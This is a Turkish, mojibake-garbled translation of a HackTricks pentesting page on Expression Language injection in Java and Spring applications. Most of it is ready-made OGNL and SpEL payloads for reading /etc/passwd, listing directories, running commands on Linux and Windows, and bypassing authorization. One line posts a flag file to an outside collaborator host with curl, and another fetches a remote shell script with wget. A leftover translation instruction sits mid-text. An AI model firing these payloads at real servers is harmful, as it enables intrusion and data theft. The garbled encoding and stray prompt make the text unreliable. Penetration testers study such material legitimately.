# EL - Expression Language

<details>

<summary><strong>AWS hackleme becerilerinizi sÄ±fÄ±rdan ileri seviyeye taÅŸÄ±yÄ±n</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile</strong>!</summary>

* Bir **cybersecurity ÅŸirketinde** Ã§alÄ±ÅŸÄ±yor musunuz? **Åirketinizi HackTricks'te reklamÄ±nÄ± yapmak** ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonunu.
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile gÃ¶ndererek paylaÅŸÄ±n**.

</details>

## Temel Bilgiler

Expression Language (EL), sunum katmanÄ± (Ã¶rneÄŸin, web sayfalarÄ±) ile uygulama mantÄ±ÄŸÄ± (Ã¶rneÄŸin, yÃ¶netilen nesneler) arasÄ±nda etkileÅŸim saÄŸlayarak JavaEE'de Ã¶nemli bir rol oynar. AÄŸÄ±rlÄ±klÄ± olarak ÅŸu alanlarda kullanÄ±lÄ±r:

- **JavaServer Faces (JSF)**: ArayÃ¼z bileÅŸenlerini arka uÃ§ veri/aksiyonlarÄ±na baÄŸlamak iÃ§in.
- **JavaServer Pages (JSP)**: JSP sayfalarÄ± iÃ§inde veri eriÅŸimi ve manipÃ¼lasyonu iÃ§in.
- **Contexts and Dependency Injection for Java EE (CDI)**: Web katmanÄ±nÄ±n yÃ¶netilen nesnelerle etkileÅŸimini kolaylaÅŸtÄ±rmak iÃ§in.

**KullanÄ±m BaÄŸlamlarÄ±**:

- **Spring Framework**: GÃ¼venlik ve Veri gibi Ã§eÅŸitli modÃ¼llerde kullanÄ±lÄ±r.
- **Genel KullanÄ±m**: Java, Kotlin ve Scala gibi JVM tabanlÄ± dillerdeki geliÅŸtiriciler tarafÄ±ndan SpEL API aracÄ±lÄ±ÄŸÄ±yla kullanÄ±lÄ±r.

EL, JavaEE teknolojilerinde, baÄŸÄ±msÄ±z ortamlarda bulunur ve `.jsp` veya `.jsf` dosya uzantÄ±larÄ±, yÄ±ÄŸÄ±n hatalarÄ± ve "Servlet" gibi terimlerle tanÄ±nÄ±r. Bununla birlikte, Ã¶zellikleri ve belirli karakterlerin kullanÄ±mÄ± sÃ¼rÃ¼m baÄŸÄ±mlÄ± olabilir.

{% hint style="info" %}
**EL sÃ¼rÃ¼mÃ¼ne** baÄŸlÄ± olarak bazÄ± **Ã¶zellikler** **aÃ§Ä±k** veya **kapalÄ±** olabilir ve genellikle bazÄ± **karakterler** **yasaklanmÄ±ÅŸ** olabilir.
{% endhint %}

## Temel Ã–rnek

(EL hakkÄ±nda baÅŸka bir ilginÃ§ Ã¶ÄŸreticiye [https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/](https://pentest-tools.com/blog/exploiting-ognl-injection-in-apache-struts/) adresinden ulaÅŸabilirsiniz)

[Maven](https://mvnrepository.com) deposundan aÅŸaÄŸÄ±daki jar dosyalarÄ±nÄ± indirin:

* `commons-lang3-3.9.jar`
* `spring-core-5.2.1.RELEASE.jar`
* `commons-logging-1.2.jar`
* `spring-expression-5.2.1.RELEASE.jar`

Ve aÅŸaÄŸÄ±daki `Main.java` dosyasÄ±nÄ± oluÅŸturun:
```java
import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;

public class Main {
public static ExpressionParser PARSER;

public static void main(String[] args) throws Exception {
PARSER = new SpelExpressionParser();

System.out.println("Enter a String to evaluate:");
java.io.BufferedReader stdin = new java.io.BufferedReader(new java.io.InputStreamReader(System.in));
String input = stdin.readLine();
Expression exp = PARSER.parseExpression(input);
String result = exp.getValue().toString();
System.out.println(result);
}
}
```
Sonra kodu derleyin (eÄŸer `javac` yÃ¼klÃ¼ deÄŸilse, `sudo apt install default-jdk` komutunu kullanarak yÃ¼kleyin):
```java
javac -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:. Main.java
```
UygulamayÄ± ÅŸu komutla Ã§alÄ±ÅŸtÄ±rÄ±n:
```java
java -cp commons-lang3-3.9.jar:spring-core-5.2.1.RELEASE.jar:spring-expression-5.2.1.RELEASE.jar:commons-lang3-3.9.jar:commons-logging-1.2.jar:. Main
Enter a String to evaluate:
{5*5}
[25]
```
Ã–nceki Ã¶rnekte `{5*5}` terimi **deÄŸerlendirildi**.

## **CVE TabanlÄ± Ã–ÄŸretici**

Bunu **bu gÃ¶nderide kontrol edin: [https://xvnpw.medium.com/hacking-spel-part-1-d2ff2825f62a](https://xvnpw.medium.com/hacking-spel-part-1-d2ff2825f62a)**

## YÃ¼kler

### Temel eylemler
```bash
#Basic string operations examples
{"a".toString()}
[a]

{"dfd".replace("d","x")}
[xfx]

#Access to the String class
{"".getClass()}
[class java.lang.String]

#Access ro the String class bypassing "getClass"
#{""["class"]}

#Access to arbitrary class
{"".getClass().forName("java.util.Date")}
[class java.util.Date]

#List methods of a class
{"".getClass().forName("java.util.Date").getMethods()[0].toString()}
[public boolean java.util.Date.equals(java.lang.Object)]
```
### Tespit

* Burp tespiti
```bash
gk6q${"zkz".toString().replace("k", "x")}doap2
#The value returned was "igk6qzxzdoap2", indicating of the execution of the expression.
```
* J2EE tespiti
```bash
#J2EEScan Detection vector (substitute the content of the response body with the content of the "INJPARAM" parameter concatenated with a sum of integer):
https://www.example.url/?vulnerableParameter=PRE-${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.print(new%20java.lang.Integer(829%2b9))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}-POST&INJPARAM=HOOK_VAL
```
* 10 saniye bekle
```bash
#Blind detection vector (sleep during 10 seconds)
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23kzxs%3d%40java.lang.Thread%40sleep(10000)%2c1%3f%23xx%3a%23request.toString}
```
### Uzaktan Dosya Dahil Etme

Uzaktan Dosya Dahil Etme (Remote File Inclusion), bir web uygulamasÄ±nÄ±n, kullanÄ±cÄ± tarafÄ±ndan kontrol edilebilen bir dosyayÄ± dinamik olarak dahil etmesi nedeniyle ortaya Ã§Ä±kan bir gÃ¼venlik aÃ§Ä±ÄŸÄ±dÄ±r. Bu aÃ§Ä±k, saldÄ±rganÄ±n web sunucusunda bulunan bir dosyayÄ± uzaktan yÃ¼rÃ¼tmesine olanak tanÄ±r.

Bu saldÄ±rÄ±, genellikle web uygulamasÄ±nÄ±n kullanÄ±cÄ± tarafÄ±ndan saÄŸlanan bir parametreyi doÄŸrudan bir dosya yoluna dÃ¶nÃ¼ÅŸtÃ¼rdÃ¼ÄŸÃ¼ durumlarda gerÃ§ekleÅŸir. SaldÄ±rgan, bu parametreyi manipÃ¼le ederek, kendi kÃ¶tÃ¼ niyetli dosyasÄ±nÄ± dahil etmeyi baÅŸarÄ±r.

Bu tÃ¼r bir saldÄ±rÄ±, saldÄ±rganÄ±n web sunucusunda bulunan hassas bilgilere eriÅŸmesine veya kÃ¶tÃ¼ amaÃ§lÄ± kodu yÃ¼rÃ¼tmesine olanak tanÄ±r. Bu nedenle, web uygulamalarÄ±nÄ±n gÃ¼venliÄŸini saÄŸlamak iÃ§in, kullanÄ±cÄ± tarafÄ±ndan saÄŸlanan parametrelerin doÄŸru bir ÅŸekilde iÅŸlenmesi ve gÃ¼venlik kontrollerinin uygulanmasÄ± Ã¶nemlidir.
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=new%20java.io.FileInputStream(%23wwww),%23qqqq=new%20java.lang.Long(%23wwww.length()),%23tttt=new%20byte[%23qqqq.intValue()],%23llll=%23pppp.read(%23tttt),%23pppp.close(),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(new+java.lang.String(%23tttt))%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=%2fetc%2fpasswd
```
### Dizin Listeleme

Directory listing, bir sunucunun belirli bir dizindeki dosyalarÄ± ve alt dizinleri listelemesidir. Bu, bir saldÄ±rganÄ±n hedef sunucuda bulunan dosyalarÄ± keÅŸfetmesine ve potansiyel olarak hassas bilgilere eriÅŸmesine olanak tanÄ±r. Dizin listeleme saldÄ±rÄ±larÄ±, genellikle web uygulamalarÄ±nda kullanÄ±lan sunucu tarafÄ± betik enjeksiyonu (Server-Side Template Injection - SSTI) gibi zayÄ±f noktalarÄ± hedefler. Bu saldÄ±rÄ±lar, sunucunun yanÄ±tÄ±nda gÃ¶rÃ¼nen hedef dizinlerin veya dosyalarÄ±n listesini elde etmek iÃ§in kullanÄ±labilir.
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=new%20java.io.File(%23parameters.INJPARAM[0]),%23pppp=%23wwww.listFiles(),%23qqqq=@java.util.Arrays@toString(%23pppp),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23qqqq)%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=..
```
### Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE)

* Temel Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma **aÃ§Ä±klamasÄ±**
```bash
#Check the method getRuntime is there
{"".getClass().forName("java.lang.Runtime").getMethods()[6].toString()}
[public static java.lang.Runtime java.lang.Runtime.getRuntime()]

#Execute command (you won't see the command output in the console)
{"".getClass().forName("java.lang.Runtime").getRuntime().exec("curl http://127.0.0.1:8000")}
[Process[pid=10892, exitValue=0]]

#Execute command bypassing "getClass"
#{""["class"].forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("curl <instance>.burpcollaborator.net")}

# With HTMl entities injection inside the template
<a th:href="${''.getClass().forName('java.lang.Runtime').getRuntime().exec('curl -d @/flag.txt burpcollab.com')}" th:title='pepito'>
```
* RCE **linux**
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="%2fbin%2fsh",%23ssss[1]="%2dc",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
```
* RCE **Windows** (test edilmedi)
```bash
https://www.example.url/?vulnerableParameter=${%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23wwww=@java.lang.Runtime@getRuntime(),%23ssss=new%20java.lang.String[3],%23ssss[0]="cmd",%23ssss[1]="%2fC",%23ssss[2]=%23parameters.INJPARAM[0],%23wwww.exec(%23ssss),%23kzxs%3d%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23kzxs.print(%23parameters.INJPARAM[0])%2c%23kzxs.close(),1%3f%23xx%3a%23request.toString}&INJPARAM=touch%20/tmp/InjectedFile.txt
```
* **Daha Fazla Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE)**
```java
// Common RCE payloads
''.class.forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec(<COMMAND STRING/ARRAY>)
''.class.forName('java.lang.ProcessBuilder').getDeclaredConstructors()[1].newInstance(<COMMAND ARRAY/LIST>).start()

// Method using Runtime via getDeclaredConstructors
#{session.setAttribute("rtc","".getClass().forName("java.lang.Runtime").getDeclaredConstructors()[0])}
#{session.getAttribute("rtc").setAccessible(true)}
#{session.getAttribute("rtc").getRuntime().exec("/bin/bash -c whoami")}

// Method using processbuilder
${request.setAttribute("c","".getClass().forName("java.util.ArrayList").newInstance())}
${request.getAttribute("c").add("cmd.exe")}
${request.getAttribute("c").add("/k")}
${request.getAttribute("c").add("ping x.x.x.x")}
${request.setAttribute("a","".getClass().forName("java.lang.ProcessBuilder").getDeclaredConstructors()[0].newInstance(request.getAttribute("c")).start())}
${request.getAttribute("a")}

// Method using Reflection & Invoke
${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}

// Method using ScriptEngineManager one-liner
${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}

// Method using ScriptEngineManager
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");

//https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt
(T(org.springframework.util.StreamUtils).copy(T(java.lang.Runtime).getRuntime().exec("cmd "+T(java.lang.String).valueOf(T(java.lang.Character).toChars(0x2F))+"c "+T(java.lang.String).valueOf(new char[]{T(java.lang.Character).toChars(100)[0],T(java.lang.Character).toChars(105)[0],T(java.lang.Character).toChars(114)[0]})).getInputStream(),T(org.springframework.web.context.request.RequestContextHolder).currentRequestAttributes().getResponse().getOutputStream()))
T(java.lang.System).getenv()[0]
T(java.lang.Runtime).getRuntime().exec('ping my-domain.com')
T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("cmd /c dir").getInputStream())
''.class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')
```
### OrtamÄ± Ä°nceleme

* `applicationScope` - genel uygulama deÄŸiÅŸkenleri
* `requestScope` - istek deÄŸiÅŸkenleri
* `initParam` - uygulama baÅŸlatma deÄŸiÅŸkenleri
* `sessionScope` - oturum deÄŸiÅŸkenleri
* `param.X` - X, bir http parametresinin adÄ± olan param deÄŸeri

Bu deÄŸiÅŸkenleri String olarak dÃ¶nÃ¼ÅŸtÃ¼rmeniz gerekecektir:
```bash
${sessionScope.toString()}
```
#### Yetkilendirme atlatma Ã¶rneÄŸi

The following is content from a hacking book about hacking techiques. The following content is from the file /hive/hacktricks/pentesting-web/ssti-server-side-template-injection/el-expression-language.md. Translate the relevant English text to Turkish and return the translation keeping excatly the same markdown and html syntax. Do not translate things like code, hacking technique names, hacking word, cloud/SaaS platform names (like Workspace, aws, gcp...), the word 'leak', pentesting, and markdown tags. Also don't add any extra stuff apart from the translation and markdown syntax.
```bash
${pageContext.request.getSession().setAttribute("admin", true)}
```
Uygulama ayrÄ±ca Ã¶zel deÄŸiÅŸkenler de kullanabilir, Ã¶rneÄŸin:
```bash
${user}
${password}
${employee.FirstName}
```
## WAF GeÃ§iÅŸi

[https://h1pmnh.github.io/post/writeup\_spring\_el\_waf\_bypass/](https://h1pmnh.github.io/post/writeup\_spring\_el\_waf\_bypass/) adresine bakÄ±n.

## Referanslar

* [https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/](https://techblog.mediaservice.net/2016/10/exploiting-ognl-injection/)
* [https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf](https://www.exploit-db.com/docs/english/46303-remote-code-execution-with-el-injection-vulnerabilities.pdf)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#tools](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#tools)
* [https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt](https://github.com/marcin33/hacking/blob/master/payloads/spel-injections.txt)

<details>

<summary><strong>AWS hackleme konusunda sÄ±fÄ±rdan kahramana kadar Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Bir **cybersecurity ÅŸirketinde** Ã§alÄ±ÅŸÄ±yor musunuz? **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek** ister misiniz? veya **PEASS'Ä±n en son sÃ¼rÃ¼mÃ¼ne veya HackTricks'i PDF olarak indirmek** ister misiniz? [**ABONELÄ°K PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuz olan Ã¶zel [**NFT'lerimizi**](https://opensea.io/collection/the-peass-family) keÅŸfedin.
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin.
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katÄ±lÄ±n** veya **Twitter** ğŸ¦[**@carlospolopm**](https://twitter.com/hacktricks_live)**'u takip edin**.
* **Hacking hilelerinizi** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **ve** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **ile gÃ¶ndererek paylaÅŸÄ±n**.

</details>
